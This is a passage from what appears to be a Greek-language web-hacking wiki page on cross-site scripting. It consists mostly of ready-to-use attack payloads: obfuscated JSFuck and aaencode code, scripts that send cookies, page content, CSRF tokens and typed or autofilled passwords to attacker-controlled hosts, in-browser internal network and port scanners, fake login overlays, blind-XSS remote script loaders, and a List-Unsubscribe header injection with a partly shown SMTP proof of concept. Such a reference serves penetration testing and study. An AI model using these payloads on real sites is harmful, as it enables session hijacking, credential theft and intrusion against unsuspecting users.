(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## Συνηθισμένα XSS payloads

### Πολλαπλά payloads σε 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Κάντε τον χρήστη να πλοηγηθεί στη σελίδα χωρίς να βγει από ένα iframe και κλέψτε τις ενέργειές του (συμπεριλαμβανομένων των πληροφοριών που αποστέλλονται σε φόρμες):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Ανάκτηση Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> **Δεν θα μπορείτε να έχετε πρόσβαση στα cookies από το JavaScript** αν το HTTPOnly flag έχει οριστεί στο cookie. Αλλά εδώ έχετε [some ways to bypass this protection](../hacking-with-cookies/index.html#httponly) αν είστε αρκετά τυχεροί.

### Κλοπή Περιεχομένου Σελίδας
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Εύρεση εσωτερικών διευθύνσεων IP
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Σύντομοι χρόνοι υποδεικνύουν responding port_ _Μεγαλύτεροι χρόνοι υποδεικνύουν έλλειψη απάντησης._

Δείτε τη λίστα με τα ports που έχουν απαγορευτεί στο Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) και στο Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Πλαίσιο για αίτηση credentials
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Καταγραφή κωδικών από αυτόματη συμπλήρωση
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Όταν οποιαδήποτε δεδομένα εισάγονται στο πεδίο password, το username και το password αποστέλλονται στον attackers server — ακόμη και αν ο client επιλέξει ένα saved password και δεν γράψει τίποτα, τα credentials θα ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

Αν ένας κρίσιμος handler (π.χ. `function DoLogin(){...}`) δηλώνεται αργότερα στη σελίδα, και το payload σου τρέχει νωρίτερα (π.χ. μέσω ενός inline JS-in-JS sink), δήλωσε πρώτα ένα `const` με το ίδιο όνομα για να προλάβεις και να κλειδώσεις τον handler. Οι μετέπειτα δηλώσεις function δεν μπορούν να επαναδεσμεύσουν ένα όνομα `const`, αφήνοντας το hook σου υπό έλεγχο:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Σημειώσεις
- Αυτό εξαρτάται από τη σειρά εκτέλεσης: η έγχυσή σας πρέπει να εκτελεστεί πριν από την νόμιμη δήλωση.
- Εάν το payload σας είναι τυλιγμένο σε `eval(...)`, οι δεσμεύσεις `const/let` δεν θα γίνουν global. Χρησιμοποιήστε την δυναμική τεχνική εισαγωγής `<script>` από την ενότητα “Deliverable payloads with eval(atob()) and scope nuances” για να εξασφαλίσετε μια πραγματική global, μη-επαναδεσμεύσιμη δεσμεύση.
- Όταν φίλτρα λέξεων-κλειδιών αποκλείουν κώδικα, συνδυάστε με Unicode-escaped identifiers ή `eval(atob('...'))` παράδοση, όπως φαίνεται παραπάνω.

### Keylogger

Απλώς ψάχνοντας στο github βρήκα μερικά διαφορετικά:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Μπορείτε επίσης να χρησιμοποιήσετε το metasploit `http_javascript_keylogger`

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Κλοπή μηνυμάτων PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Κατάχρηση Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Πρόσβαση στο Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Μπορείτε επίσης να χρησιμοποιήσετε: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Πρόσβαση σε Κρυφό Περιεχόμενο

Από [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) μπορεί κανείς να μάθει ότι ακόμα κι αν κάποιες τιμές εξαφανιστούν από το JS, εξακολουθεί να είναι δυνατό να τις βρει σε JS attributes σε διαφορετικά αντικείμενα. Για παράδειγμα, ένα input ενός REGEX εξακολουθεί να μπορεί να βρεθεί ακόμη και αφού η τιμή του input του regex αφαιρεθεί:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS Κατάχρηση άλλων ευπαθειών

### XSS σε Markdown

Μπορείς να εγχύσεις Markdown κώδικα που θα αποδοθεί; Ίσως να καταφέρεις XSS! Δες:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS σε SSRF

Έχεις XSS σε έναν **ιστότοπο που κάνει caching**; Δοκίμασε να **αναβαθμίσεις αυτό σε SSRF** μέσω Edge Side Include Injection με αυτό το payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Use it to bypass cookie restrictions, XSS filters and much more!\
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS σε δυναμικά δημιουργημένο PDF

Αν μια ιστοσελίδα δημιουργεί ένα PDF χρησιμοποιώντας είσοδο που ελέγχεται από τον χρήστη, μπορείτε να προσπαθήσετε να **ξεγελάσετε το bot** που δημιουργεί το PDF ώστε να **εκτελέσει αυθαίρετο JS code**.\
Άρα, αν το **PDF creator bot finds** κάποιο είδος **HTML** **tags**, θα τα **ερμηνεύσει**, και μπορείτε να **εκμεταλλευτείτε** αυτή τη συμπεριφορά για να προκαλέσετε **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Αν δεν μπορείτε να εισάγετε **HTML tags** ίσως αξίζει να δοκιμάσετε να **inject PDF data**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

Το AMP, στοχεύει στην επιτάχυνση της απόδοσης των web pages σε κινητές συσκευές, ενσωματώνει HTML tags συμπληρωμένα με JavaScript για να διασφαλίσει τη λειτουργικότητα με έμφαση στην ταχύτητα και την ασφάλεια. Υποστηρίζει μια σειρά από components για διάφορα χαρακτηριστικά, προσβάσιμα μέσω [AMP components](https://amp.dev/documentation/components/?format=websites).

The [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) format extends specific AMP components to emails, enabling recipients to interact with content directly within their emails.

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

Το RFC 2369 `List-Unsubscribe` header ενσωματώνει attacker-controlled URIs που πολλοί webmail και mail clients μετατρέπουν αυτόματα σε κουμπιά "Unsubscribe". Όταν αυτές οι URIs αποδίδονται ή ανακτώνται χωρίς validation, το header γίνεται σημείο injection τόσο για stored XSS (αν ο unsubscribe link τοποθετηθεί στο DOM) όσο και για SSRF (αν ο server εκτελεί το unsubscribe request εκ μέρους του χρήστη).

#### Stored XSS via `javascript:` URIs

1. **Στείλτε στον εαυτό σας ένα email** όπου το header δείχνει σε ένα `javascript:` URI ενώ κρατάτε το υπόλοιπο μήνυμα αθώο ώστε τα spam filters να μην το απορρίψουν.
2. **Βεβαιωθείτε ότι το UI αποδίδει την τιμή** (πολλοί clients την εμφανίζουν σε ένα "List Info" pane) και ελέγξτε αν το προκύπτον `<a>` tag κληρονομεί attacker-controlled attributes όπως `href` ή `target`.
3. **Προκαλέστε εκτέλεση** (π.χ., CTRL+click, middle-click, ή "open in new tab") όταν το link χρησιμοποιεί `target="_blank"`· τα browsers θα αξιολογήσουν το παρεχόμενο JavaScript στο origin της webmail εφαρμογής.
4. Παρατηρήστε τον stored-XSS primitive: το payload παραμένει μαζί με το email και απαιτεί μόνο ένα κλικ για να εκτελεστεί.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Το newline byte (`%0a`) στο URI δείχνει ότι ακόμη και ασυνήθιστοι χαρακτήρες επιβιώνουν στη rendering pipeline σε ευάλωτους clients όπως το Horde IMP H5, που θα εμφανίσει τη συμβολοσειρά κατά λέξη μέσα στην anchor tag.

<details>
<summary>Ελάχιστο SMTP PoC που παραδίδει έναν κακόβουλο List-Unsubscribe header</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
